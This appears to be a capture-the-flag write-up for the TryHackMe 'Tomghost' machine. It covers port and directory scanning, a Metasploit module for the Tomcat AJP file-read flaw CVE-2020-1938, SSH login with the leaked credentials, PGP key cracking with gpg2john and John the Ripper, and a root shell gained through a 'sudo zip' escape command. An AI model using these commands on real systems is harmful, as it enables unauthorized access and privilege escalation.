---
layout: post
permalink: /posts/thm/tomghost
title: "Tomghost"
---

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to. <br/>

Let's scan the target machine for open ports with nmap

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/tomghost/nmap.png)

There are open ports 22, 53 8009 and 8080. Go and visit the website.

![website](/assets/images/thm/tomghost/website.png)

It's Apache Tomcat. I tried to scan for any hidden directories with gobuster

```
gobuster dir -u http://10.10.59.117:8080/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![gobuster](/assets/images/thm/tomghost/gobuster.png)

Unfortunately I didn't find anything useful. I wasn't sure what is the service running on port 8009. So I just googled `Apache Jserv` and found an exploit for it `CVE-2020-1938` <https://www.exploit-db.com/exploits/49039>. I learnt that using metasploit we'll be able to read files deplyed on Tomcat. Start Metasploit and execute `search ajp` 

![ms-search](/assets/images/thm/tomghost/ms-search.png)

We are going to use the auxiliary module.

![ms-options](/assets/images/thm/tomghost/ms-options.png)

Looking for the options we see that we need to provide the target machine IP.

```
set RHOSTS <IP>
```

Now just execute the `run` command.

![ms-result](/assets/images/thm/tomghost/ms-result.png)

We found credentials. Let's try to ssh with them.

```
ssh skyfuck@<IP>
```

![skyfuck-ls](/assets/images/thm/tomghost/skyfuck-ls.png)

There are two files and I wasn't sure what can I do with them so I just look for the first flag.

```
find / -name user.txt
```

![find](/assets/images/thm/tomghost/find.png)

Well, we have found the flag and also we found that there is another user `merlin`. I tried to check whether our current user has any root permisson to execute commands `sudo -l` but unfortunately skyfuck he has no any rights to execte commands as root.

![skyfuck-sudo](/assets/images/thm/tomghost/skyfuck-sudo.png)

So I decided to go back to the files we had found in skyfuck directory. I researched for what is pgp, it stands out for Pretty Good Privacy and it is used to encypt files. After some additional research we found that we can brute force the key `tryhackme.asc`  but first we have to convert it to hash and John the Ripper has the perfect script for that purpose `gpg2john`. We can use SSH to download the files.

```
scp skyfuck@<IP>:credential.pgp .
scp skyfuck@<IP>:tryhackme.asc .
```

The dot in the end means the current directory. Now let's convert the key

```
gpg2john tryhackme.asc > hash.txt
```

![hash](/assets/images/thm/tomghost/hash.png)

We have the hash, let's crack it.

```
john hash.txt --wordlist=rockyou.txt
```

![john](/assets/images/thm/tomghost/john.png)

Now we need to import the key and decrypt the pgp file

```
gpg --import tryhackme.asc
gpg --decrypt credential.pgp > cred.txt
```

![merlin-creds](/assets/images/thm/tomghost/merlin-creds.png)

Now we have merlin credentials. Go back to te target machine and switch the user `su merlin`. Let's see whether merlin has any right to execute commands as root

```
sudo -l
```

![sudo-l](/assets/images/thm/tomghost/sudo-l.png)

We are in luck. Visit <https://gtfobins.github.io/gtfobins/zip/> and see how we can escalate our priviliges using `zip` command

![gtfo](/assets/images/thm/tomghost/gtfo.png)

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

![root](/assets/images/thm/tomghost/root.png)

Yey... we were able to get root access.
